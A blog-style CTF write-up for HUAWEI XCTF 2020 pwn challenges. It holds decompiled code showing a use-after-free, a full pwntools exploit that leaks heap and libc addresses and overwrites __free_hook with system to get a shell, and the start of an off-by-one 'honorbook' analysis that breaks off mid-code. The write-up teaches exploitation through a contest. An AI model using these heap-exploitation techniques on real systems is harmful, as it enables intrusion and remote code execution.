<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>HUAWEI XCTF 2020 PWN WRITE UP | Hexo</title><script src="//unpkg.com/valine/dist/Valine.min.js"></script><script>var config = {"root":"/","path":""}</script><script src="//unpkg.com/mermaid@8.13.5/dist/mermaid.min.js"></script><script>mermaid.initialize({
 startOnLoad: true
 , theme: 'dark'
});</script><link rel="stylesheet" href="/css/arknights.css"><link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.4.0/styles/atom-one-dark-reasonable.min.css"><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body style="background-image:url(https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg);"><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><ol class="navContent"><li class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></li><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/demo/"><span class="navItemTitle">独立页面</span></a></li></ol></nav><div class="search-popup"><div id="search-result"></div></div></header><article><div id="post-bg"><div id="post-title"><h1>HUAWEI XCTF 2020 PWN WRITE UP</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2021-01-08T06:43:24.000Z" id="date"> 2021-01-08</time></div></span><br><span>Last Update: <div class="control"><time datetime="2022-04-30T14:13:10.480Z" id="updated"> 2022-04-30</time></div></span><br><span>Word Count: <div class="control">4.1k</div></span><br><span>Read Time: <div class="control">25 min</div></span></div></div><hr><div id="post-content"><h1 id="HUAWEI-XCTF-2020-PWN-WRITE-UP"><a href="#HUAWEI-XCTF-2020-PWN-WRITE-UP" class="headerlink" title="HUAWEI XCTF 2020 PWN WRITE UP"></a>HUAWEI XCTF 2020 PWN WRITE UP</h1><h1 id="HUAWEI-XCTF-2020-First"><a href="#HUAWEI-XCTF-2020-First" class="headerlink" title="HUAWEI XCTF 2020 First"></a>HUAWEI XCTF 2020 First</h1><h2 id="CPP"><a href="#CPP" class="headerlink" title="CPP"></a>CPP</h2><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Arch:     amd64-64-little<br>RELRO:    Full RELRO<br>Stack:    Canary found<br>NX:       NX enabled<br>PIE:      PIE enabled<br></code></pre></td></tr></table></figure>

<p>Use the cutter decompiler to analize this program</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">undefined8 <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int64_t</span> *piVar1;<br>    <span class="hljs-type">int64_t</span> iVar2;<br>    undefined *arg1;<br>    undefined *puVar3;<br>    <span class="hljs-type">int64_t</span> in_FS_OFFSET;<br>    <span class="hljs-type">uint64_t</span> uStack40;<br>    <span class="hljs-type">int64_t</span> iStack32;<br>    <br>    iStack32 = *(<span class="hljs-type">int64_t</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);<br>    <span class="hljs-built_in">setvbuf</span>(_reloc.stdin, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">setvbuf</span>(_reloc.stdout, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">setvbuf</span>(_reloc.stderr, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>    uStack40 = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>( <span class="hljs-literal">true</span> ) &#123;<br>        <span class="hljs-keyword">while</span>( <span class="hljs-literal">true</span> ) &#123;<br>            <br>            std::basic_ostream&lt;<span class="hljs-type">char</span>, std::char_traits&lt;<span class="hljs-type">char</span>&gt; &gt;&amp; std::__ostream_insert&lt;<span class="hljs-type">char</span>, std::char_traits&lt;<span class="hljs-type">char</span>&gt; &gt;(std::basic_ostream&lt;<span class="hljs-type">char</span>, std::char_traits&lt;<span class="hljs-type">char</span>&gt; &gt;&amp;, <span class="hljs-type">char</span> <span class="hljs-type">const</span>*, <span class="hljs-type">long</span>)<br>                      (reloc.std::cout, <span class="hljs-number">0x2004</span>, <span class="hljs-number">2</span>);<br>            uStack40 = <span class="hljs-number">0x539</span>;<br>            std::istream&amp; std::istream::_M_extract&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>&gt;(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>&amp;)(reloc.std::cin, &amp;uStack40);<br>            <span class="hljs-keyword">if</span> (uStack40 != <span class="hljs-number">0</span>) <span class="hljs-keyword">break</span>;<br>            arg1 = (undefined *)<span class="hljs-keyword">operator</span> <span class="hljs-keyword">new</span>[](<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(<span class="hljs-number">8</span>);<br>            puVar3 = arg1;<br>            <span class="hljs-keyword">do</span> &#123;<br>                *puVar3 = <span class="hljs-number">0</span>;<br>                puVar3 = puVar3 + <span class="hljs-number">1</span>;<br>            &#125; <span class="hljs-keyword">while</span> (puVar3 != arg1 + <span class="hljs-number">8</span>);<br>            <br>            std::basic_ostream&lt;<span class="hljs-type">char</span>, std::char_traits&lt;<span class="hljs-type">char</span>&gt; &gt;&amp; std::<span class="hljs-keyword">operator</span>&lt;&lt; &lt;std::char_traits&lt;<span class="hljs-type">char</span>&gt; &gt;(std::basic_ostream&lt;<span class="hljs-type">char</span>, std::char_traits&lt;<span class="hljs-type">char</span>&gt; &gt;&amp;, <span class="hljs-type">char</span> <span class="hljs-type">const</span>*)<br>                      (reloc.std::cout, <span class="hljs-number">0x2004</span>);<br>            fcn<span class="hljs-number">.000012</span>c9((<span class="hljs-type">int64_t</span>)arg1, <span class="hljs-number">8</span>);<br>            <br>            std::basic_ostream&lt;<span class="hljs-type">char</span>, std::char_traits&lt;<span class="hljs-type">char</span>&gt; &gt;&amp; std::<span class="hljs-keyword">operator</span>&lt;&lt; &lt;std::char_traits&lt;<span class="hljs-type">char</span>&gt; &gt;(std::basic_ostream&lt;<span class="hljs-type">char</span>, std::char_traits&lt;<span class="hljs-type">char</span>&gt; &gt;&amp;, <span class="hljs-type">char</span> <span class="hljs-type">const</span>*)<br>                      (reloc.std::cout, <span class="hljs-number">0x2004</span>);<br>            std::istream&amp; std::istream::_M_extract&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>&gt;(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>&amp;)(reloc.std::cin, &amp;uStack40);<br>            <span class="hljs-keyword">if</span> (uStack40 &lt; <span class="hljs-number">0x100</span>) &#123;<br>                piVar1 = (<span class="hljs-type">int64_t</span> *)(uStack40 * <span class="hljs-number">8</span> + <span class="hljs-number">0x42e0</span>);<br>                iVar2 = *piVar1;<br>                *piVar1 = (<span class="hljs-type">int64_t</span>)arg1;<br>                <span class="hljs-keyword">if</span> (iVar2 != <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-keyword">operator</span> <span class="hljs-keyword">delete</span>[](<span class="hljs-type">void</span>*)();<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">operator</span> <span class="hljs-keyword">delete</span>[](<span class="hljs-type">void</span>*)(arg1);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (uStack40 != <span class="hljs-number">1</span>) <span class="hljs-keyword">break</span>;<br>        <br>        std::basic_ostream&lt;<span class="hljs-type">char</span>, std::char_traits&lt;<span class="hljs-type">char</span>&gt; &gt;&amp; std::<span class="hljs-keyword">operator</span>&lt;&lt; &lt;std::char_traits&lt;<span class="hljs-type">char</span>&gt; &gt;(std::basic_ostream&lt;<span class="hljs-type">char</span>, std::char_traits&lt;<span class="hljs-type">char</span>&gt; &gt;&amp;, <span class="hljs-type">char</span> <span class="hljs-type">const</span>*)<br>                  (reloc.std::cout, <span class="hljs-number">0x2004</span>);<br>        std::istream&amp; std::istream::_M_extract&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>&gt;(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>&amp;)(reloc.std::cin, &amp;uStack40);<br>        <span class="hljs-keyword">if</span> (uStack40 &lt; <span class="hljs-number">0x100</span>) &#123;<br>            piVar1 = (<span class="hljs-type">int64_t</span> *)(uStack40 * <span class="hljs-number">8</span> + <span class="hljs-number">0x42e0</span>);<br>            iVar2 = *piVar1;<br>            *piVar1 = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">if</span> (iVar2 != <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">operator</span> <span class="hljs-keyword">delete</span>[](<span class="hljs-type">void</span>*)(iVar2);<br>                <span class="hljs-built_in">puts</span>(iVar2);<br>                <br>                std::basic_ostream&lt;<span class="hljs-type">char</span>, std::char_traits&lt;<span class="hljs-type">char</span>&gt; &gt;&amp; std::<span class="hljs-keyword">operator</span>&lt;&lt; &lt;std::char_traits&lt;<span class="hljs-type">char</span>&gt; &gt;(std::basic_ostream&lt;<span class="hljs-type">char</span>, std::char_traits&lt;<span class="hljs-type">char</span>&gt; &gt;&amp;, <span class="hljs-type">char</span> <span class="hljs-type">const</span>*)<br>                          (reloc.std::cout, <span class="hljs-number">0x2004</span>);<br>                fcn<span class="hljs-number">.000012</span>c9(iVar2, <span class="hljs-number">8</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (iStack32 == *(<span class="hljs-type">int64_t</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-comment">// WARNING: Subroutine does not return</span><br>    __stack_chk_fail();<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>It’s easy to discover the vulnerability is uaf</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><span class="hljs-comment"># Author: i0gan</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br>r   =  <span class="hljs-keyword">lambda</span> x : io.recv(x)<br>ra  =  <span class="hljs-keyword">lambda</span>   : io.recvall()<br>rl  =  <span class="hljs-keyword">lambda</span>   : io.recvline(keepends = <span class="hljs-literal">True</span>)<br>ru  =  <span class="hljs-keyword">lambda</span> x : io.recvuntil(x, drop = <span class="hljs-literal">True</span>)<br>s   =  <span class="hljs-keyword">lambda</span> x : io.send(x)<br>sl  =  <span class="hljs-keyword">lambda</span> x : io.sendline(x)<br>sa  =  <span class="hljs-keyword">lambda</span> x, y : io.sendafter(x, y)<br>sla =  <span class="hljs-keyword">lambda</span> x, y : io.sendlineafter(x, y)<br>ia  =  <span class="hljs-keyword">lambda</span> : io.interactive()<br>c   =  <span class="hljs-keyword">lambda</span> : io.close()<br>li    = <span class="hljs-keyword">lambda</span> x : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="hljs-string">&#x27;\x1b[0m&#x27;</span>)<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>]<br><br>elf_path  = <span class="hljs-string">&#x27;chall&#x27;</span><br><span class="hljs-comment">#libc_path = &#x27;/glibc/2.23/64/lib/libc.so.6&#x27;</span><br><br><span class="hljs-comment"># remote server ip and port</span><br>server_ip = <span class="hljs-string">&quot;124.70.12.210&quot;</span><br>server_port = <span class="hljs-number">10002</span><br><br><span class="hljs-comment"># if local debug</span><br>LOCAL = <span class="hljs-number">0</span><br>LIBC  = <span class="hljs-number">1</span><br><span class="hljs-comment">#--------------------------func-----------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">db</span>():<br>	<span class="hljs-keyword">if</span>(LOCAL):<br>		gdb.attach(io)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fn1</span>(<span class="hljs-params">d, idx</span>):<br>	sla(<span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>)<br>	sla(<span class="hljs-string">&#x27;&gt;&#x27;</span>, d)<br>	sla(<span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fn2</span>(<span class="hljs-params">idx, d</span>):<br>	sla(<span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>	sla(<span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br>	sla(<span class="hljs-string">&#x27;&gt;&#x27;</span>, d)<br><br><span class="hljs-comment">#--------------------------exploit--------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>	li(<span class="hljs-string">&#x27;exploit...&#x27;</span>)<br>	<span class="hljs-comment"># leak heap</span><br>	fn1(<span class="hljs-string">&#x27;123&#x27;</span>, <span class="hljs-number">0x11</span>)<br>	fn1(<span class="hljs-string">&#x27;123&#x27;</span>, <span class="hljs-number">0x12</span>)<br><br>	fn2(<span class="hljs-number">0x11</span>, <span class="hljs-string">&#x27;AAA&#x27;</span>)<br><br>	sla(<span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>	sla(<span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0x12</span>))<br>	leak = u64(ru(<span class="hljs-string">&#x27;\x0a&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>	heap_base = leak - <span class="hljs-number">0x11eb0</span><br>	heap = leak<br>	li(<span class="hljs-string">&#x27;leak: &#x27;</span> + <span class="hljs-built_in">hex</span>(leak))<br>	<span class="hljs-comment">#li(&#x27;heap: &#x27; + hex(heap))</span><br>	sla(<span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br><br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x30</span>):<br>		fn1(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-number">0x10</span> + i)<br>	<br>	fn2(<span class="hljs-number">0x10</span>, <span class="hljs-string">&#x27;BBBB&#x27;</span>)<br>	fn2(<span class="hljs-number">0x12</span>, p64(heap + <span class="hljs-number">0x58</span>)[<span class="hljs-number">0</span>:<span class="hljs-number">7</span>])<br><br>	fn1(<span class="hljs-string">&#x27;sh\x00&#x27;</span>, <span class="hljs-number">0</span>)<br>	fn1(p64(<span class="hljs-number">0x20</span> * <span class="hljs-number">0x25</span> + <span class="hljs-number">1</span>)[<span class="hljs-number">0</span>:<span class="hljs-number">7</span>], <span class="hljs-number">1</span>)<br><br>	sla(<span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>	sla(<span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0x13</span>))<br>	leak = u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">5</span>:] + <span class="hljs-string">b&#x27;\x7f\x00\x00&#x27;</span>)<br>	libc_base = leak - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>] - <span class="hljs-number">96</span> - <span class="hljs-number">0x10</span><br>	__free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>	system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>	<span class="hljs-comment">#one_gadget = libc_base + </span><br>	li(<span class="hljs-string">&#x27;leak: &#x27;</span> + <span class="hljs-built_in">hex</span>(leak))<br>	li(<span class="hljs-string">&#x27;libc_base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>	sla(<span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br><br>	fn2(<span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;BBBB&#x27;</span>)<br>	fn2(<span class="hljs-number">0x21</span>, p64(__free_hook)[<span class="hljs-number">0</span>:<span class="hljs-number">7</span>])<br>	<br>	fn1(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-number">2</span>)<br><br>	db()<br>	fn1(p64(system), <span class="hljs-number">3</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">finish</span>():<br>	ia()<br>	c()<br><span class="hljs-comment">#--------------------------main-----------------------------</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	<span class="hljs-keyword">if</span> LOCAL:<br>		elf = ELF(elf_path)<br>		libc_path = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>		<span class="hljs-keyword">if</span> LIBC:<br>			libc = ELF(libc_path)<br>			io = elf.process(env = &#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc_path&#125; )<br>		<span class="hljs-keyword">else</span>:<br>			io = elf.process()<br>	<span class="hljs-keyword">else</span>:<br>		libc_path = <span class="hljs-string">&#x27;./libc.so.6&#x27;</span><br>		elf = ELF(elf_path)<br>		io = remote(server_ip, server_port)<br>		<span class="hljs-keyword">if</span> LIBC:<br>			libc = ELF(libc_path)<br>	exploit()<br>	finish()<br></code></pre></td></tr></table></figure>





<h1 id="HUAWEI-XCTF-2020-Second"><a href="#HUAWEI-XCTF-2020-Second" class="headerlink" title="HUAWEI XCTF 2020 Second"></a>HUAWEI XCTF 2020 Second</h1><h2 id="honorbook"><a href="#honorbook" class="headerlink" title="honorbook"></a>honorbook</h2><p>I’m not good at using gdb to debug this riscv architecture. Because this is the first time I’ve met this architecture. So I use c language to write a same function as this challenge, compile as amd64 arch to debug then analize the layout of heap. The vulnerability is off by one</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdio&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdlib&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">func</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">menu</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">del</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">modify</span><span class="hljs-params">()</span>;<br><span class="hljs-type">char</span> *plist[<span class="hljs-number">30</span>];<br><span class="hljs-type">char</span> *pname[<span class="hljs-number">30</span>];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> &#123;<br>	setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>, _IONBF, <span class="hljs-number">0</span>);<br>	setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>, _IONBF, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">menu</span><span class="hljs-params">()</span> &#123;<br>	<span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;code:&quot;</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">func</span><span class="hljs-params">()</span> &#123;<br>	<span class="hljs-type">int</span> a = <span class="hljs-number">0</span>;<br>	<span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>) &#123;<br>		menu();<br>		<span class="hljs-built_in">std</span>::<span class="hljs-built_in">cin</span> &gt;&gt; a; <br>		<span class="hljs-keyword">switch</span>(a) &#123;<br>			<span class="hljs-keyword">case</span> <span class="hljs-number">1</span>: add(); <span class="hljs-keyword">break</span>;<br>			<span class="hljs-keyword">case</span> <span class="hljs-number">2</span>: del(); <span class="hljs-keyword">break</span>;<br>			<span class="hljs-keyword">case</span> <span class="hljs-number">3</span>: show(); <span class="hljs-keyword">break</span>;<br>			<span class="hljs-keyword">case</span> <span class="hljs-number">4</span>: modify(); <span class="hljs-keyword">break</span>;<br>			<span class="hljs-keyword">default</span>: <br>				<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;code err:&quot;</span>);<br>				<span class="hljs-keyword">continue</span>;<br>		&#125;<br>	&#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span> &#123;<br>	<span class="hljs-type">size_t</span> size = <span class="hljs-number">0xe8</span>;<br>	<span class="hljs-type">int</span> idx;<br>	<span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;idx:&quot;</span>;<br>	<span class="hljs-built_in">std</span>::<span class="hljs-built_in">cin</span> &gt;&gt; idx;<br>    pname[idx] = new <span class="hljs-type">char</span>[<span class="hljs-number">0x20</span>];<br>	<span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;name:&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>    read(<span class="hljs-number">0</span>, pname[idx], <span class="hljs-number">0x18</span>);<br>    <br>	